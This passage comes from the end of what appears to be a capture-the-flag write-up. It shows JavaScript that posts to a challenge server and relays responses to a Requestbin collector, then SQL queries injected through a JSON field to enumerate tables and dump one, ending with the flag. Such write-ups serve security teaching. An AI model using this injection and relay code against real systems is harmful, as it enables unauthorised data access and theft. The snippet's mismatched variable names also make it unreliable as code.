+<span id=cb13-34><a href=#cb13-34 aria-hidden=true tabindex=-1></a>      <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span><span class=op>,</span></span>
+<span id=cb13-35><a href=#cb13-35 aria-hidden=true tabindex=-1></a>      <span class=dt>headers</span><span class=op>:</span> {</span>
+<span id=cb13-36><a href=#cb13-36 aria-hidden=true tabindex=-1></a>        <span class=st>&quot;Content-Type&quot;</span><span class=op>:</span> <span class=st>&quot;application/json&quot;</span><span class=op>,</span></span>
+<span id=cb13-37><a href=#cb13-37 aria-hidden=true tabindex=-1></a>      }<span class=op>,</span></span>
+<span id=cb13-38><a href=#cb13-38 aria-hidden=true tabindex=-1></a>    }</span>
+<span id=cb13-39><a href=#cb13-39 aria-hidden=true tabindex=-1></a>        </span>
+<span id=cb13-40><a href=#cb13-40 aria-hidden=true tabindex=-1></a>        <span class=co>// Send to Requestbin</span></span>
+<span id=cb13-41><a href=#cb13-41 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> req <span class=op>=</span> https<span class=op>.</span><span class=fu>request</span>(options2)</span>
+<span id=cb13-42><a href=#cb13-42 aria-hidden=true tabindex=-1></a>    req2<span class=op>.</span><span class=fu>write</span>(data2)</span>
+<span id=cb13-43><a href=#cb13-43 aria-hidden=true tabindex=-1></a>    req2<span class=op>.</span><span class=fu>end</span>()</span>
+<span id=cb13-44><a href=#cb13-44 aria-hidden=true tabindex=-1></a></span>
+<span id=cb13-45><a href=#cb13-45 aria-hidden=true tabindex=-1></a>  })<span class=op>;</span></span>
+<span id=cb13-46><a href=#cb13-46 aria-hidden=true tabindex=-1></a>})</span>
+<span id=cb13-47><a href=#cb13-47 aria-hidden=true tabindex=-1></a>req1<span class=op>.</span><span class=fu>write</span>(data1)</span>
+<span id=cb13-48><a href=#cb13-48 aria-hidden=true tabindex=-1></a>req1<span class=op>.</span><span class=fu>end</span>()</span></code></pre></div><figure><img src=/hw5b/Untitled%2020.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>Before when completing Part 1, you would not receive the error of
+your SQL query, but when you access the endpoint /api/ok, you now do. So
+this should be the endpoint we are looking for.</p><p>Now if we modify our SQL payload a bit:</p><div class=sourceCode id=cb14><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb14-1><a href=#cb14-1 aria-hidden=true tabindex=-1></a><span class=kw>const</span> data1 <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb14-2><a href=#cb14-2 aria-hidden=true tabindex=-1></a>  <span class=st>&quot;ok&quot;</span><span class=op>:</span> <span class=st>&quot;SELECT table_name FROM INFORMATION_SCHEMA.tables&quot;</span><span class=op>,</span></span>
+<span id=cb14-3><a href=#cb14-3 aria-hidden=true tabindex=-1></a>})</span></code></pre></div><figure><img src=/hw5b/Untitled%2021.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>We see that there is a table that looks like it is user created. And
+if we access it:</p><div class=sourceCode id=cb15><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb15-1><a href=#cb15-1 aria-hidden=true tabindex=-1></a><span class=kw>const</span> data1 <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb15-2><a href=#cb15-2 aria-hidden=true tabindex=-1></a>  <span class=st>&quot;ok&quot;</span><span class=op>:</span> <span class=st>&quot;SELECT * FROM ikuyo&quot;</span><span class=op>,</span></span>
+<span id=cb15-3><a href=#cb15-3 aria-hidden=true tabindex=-1></a>})</span></code></pre></div><figure><img src=/hw5b/Untitled%2022.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><h3 id=we-now-have-our-last-flag-for-track-b-week-5>We now have our
+last flag for Track B Week 5:</h3><h3 id=flagfuw4_fuw4_pur3_pur3_m1r4c13>flag{fuw4_fuw4_pur3_pur3_m1r4c13}</h3><p>================================================================</p><h3 id=bonus-gldanoob-wrote-a-proxy-to-the-server-so-that-we-can-just-access-the-server-through-the-browser-without-sending-so-many-requests.>Bonus:
+Gldanoob wrote a proxy to the server so that we can just access the
+server through the browser without sending so many requests.</h3><p><a href="https://gea.gldanoob.repl.co/proxy?url=chal.firebird.sh:35020">https://gea.gldanoob.repl.co/proxy?url=chal.firebird.sh:35020</a></p><p>================================================================</p><p>In conclusion, try harder.</p><p>(<del>or just beat the author up that works too.</del>)</p><footer><span class=static>Powered by <a href=https://gohugo.io/>Hugo</a></span><br><span class=static>Emojis from <a href=https://blob.cat/>blob.cat</a></span></footer></article></body></html>
